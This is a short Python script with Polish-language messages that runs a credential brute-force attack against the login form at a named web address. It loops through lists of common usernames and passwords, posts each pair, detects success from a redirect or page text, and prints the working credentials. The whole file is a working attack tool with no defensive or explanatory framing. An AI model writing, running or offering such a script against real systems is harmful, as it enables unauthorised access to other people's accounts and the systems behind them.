import requests

url = "https://test.equinox-system.com/" 

usernames = ["admin", "user", "test", "root"]
passwords = ["1234", "admin", "password", "qwerty", "test123"]

print("Rozpoczynanie ataku brute-force.")

for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(url, data=data, allow_redirects=False)

            if response.status_code == 302 or "zalogowano" in response.text.lower() or "dashboard" in response.text.lower():
                print(f"Poprawne logowanie: {username} / {password}")
                exit()
            else:
                print(f"Niepoprawne logowanie: {username} / {password}")
        except Exception as e:
            print(f"Błąd podczas próbowania: {username}/{password}: {e}")
